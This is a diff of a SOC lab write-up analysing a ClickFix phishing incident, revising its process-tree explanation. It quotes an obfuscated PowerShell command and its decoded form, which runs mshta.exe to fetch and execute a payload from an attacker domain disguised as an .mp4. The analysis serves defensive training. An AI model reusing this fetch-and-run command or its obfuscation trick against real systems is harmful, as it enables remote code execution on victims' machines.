@@ -43,6 +43,8 @@ The email impersonated Microsoft, used a fake countdown timer for urgency, and p
 
 Browser history confirms the visit to `windows-update.site` at 23:26:08.
 
+<img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />
+
 At 23:26:19, the user ran the ClickFix command from the Run dialog:
 
 ```
@@ -53,38 +55,27 @@ PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoat
 - `-replace ']'` strips the brackets, rebuilding `mshta.exe` so the name never appears in plain text (evades simple detection).
 - Everything after `#` is a comment. It's what the user sees at the end of the Run box, making the command look like a CAPTCHA check.
 
-<img width="767" height="258" alt="SOC-338-captcha" src="https://github.com/user-attachments/assets/57cfac3d-9687-49ff-a992-edefbeff8eb0" />
-
+<img width="767" height="258" alt="SOC-338-captcha" src="https://github.com/user-attachments/assets/ee25935c-cd44-4092-8638-45edab134e0e" />
 
 <img width="1225" height="520" alt="338-terminal" src="https://github.com/user-attachments/assets/ef98cb5d-eaa3-4944-9ccf-207ef88a08dc" />
 
-The process logs show the command was likely run **twice**:
+The process logs show the full chain:
+
+```
+userinit.exe
+└─ explorer.exe (PID 6920)
+   └─ powershell.exe (PID 624)    obfuscated ClickFix command
+      └─ powershell.exe (PID 7308)  -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
+         └─ mshta.exe (PID 7284)      fetches the payload
+            └─ conhost.exe
+```
 
 <img width="560" height="447" alt="SOC338-ProcessesView" src="https://github.com/user-attachments/assets/dc098e5e-c703-4a43-b96f-da40394efbdb" />
+<img width="707" height="167" alt="SOC338-PS624" src="https://github.com/user-attachments/assets/8159e2fb-5375-42c4-b1b2-77b1736d4014" />
+<img width="675" height="205" alt="SOC338-PS7308" src="https://github.com/user-attachments/assets/87d18735-339a-422d-b7d3-17eac6aa18ea" />
+<img width="525" height="206" alt="SOC338-mshta7284" src="https://github.com/user-attachments/assets/c21e73ce-6369-4f2a-bf73-acfe60bae780" />
 
-
-**First execution (23:26:20):** `mshta.exe` (PID 7284) launched from a PowerShell parent with the payload URL, connected to the payload server, and spawned `conhost.exe`, suggesting the payload may have started a console process. No PowerShell process appears in the logs before 23:26:20, so its parent could not be identified. PIDs 624 and 7308 started later and could not have launched it.
-
-<img width="525" height="206" alt="SOC-338FirstOne" src="https://github.com/user-attachments/assets/c21e73ce-6369-4f2a-bf73-acfe60bae780" />
-
-
-**Second execution (23:26:31–32):**
-
-```
-explorer.exe
-└─ powershell.exe (PID 624)    pasted command, launched from the Run dialog
-   └─ powershell.exe (PID 7308)  -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
-      └─ mshta.exe               https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
-```
-
-<img width="707" height="167" alt="SOC338-SecondExecution" src="https://github.com/user-attachments/assets/8159e2fb-5375-42c4-b1b2-77b1736d4014" />
-
-<img width="675" height="205" alt="SOC-338MoreExecution" src="https://github.com/user-attachments/assets/87d18735-339a-422d-b7d3-17eac6aa18ea" />
-
-
-PID 624's parent, `explorer.exe`, confirms the command was run manually from the Run dialog. A repeat execution is consistent with a user retrying after nothing visibly happened. Because the first execution's parent is missing from the logs, the order may instead reflect a lab timestamp inconsistency.
-
-`mshta.exe` is a legitimate Windows binary for running HTML Applications, abused here to execute remote code. The `.mp4` extension disguises the payload. All processes ran as `EC2AMAZ-ILGVOIN\LetsDefend`.
+`explorer.exe` as the parent of PID 624 confirms the user ran the command manually from the Run dialog. `mshta.exe` is a legitimate Windows binary for running HTML Applications, abused here to execute remote code, and the `.mp4` extension disguises the payload. Its `conhost.exe` child suggests the payload may have started a console process. Later log entries for PIDs 624 and 7308 (23:26:31–32) are repeat events for the same processes, not a second execution. All processes ran as `EC2AMAZ-ILGVOIN\LetsDefend`.
 
 <img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
 ### 3. Network Analysis
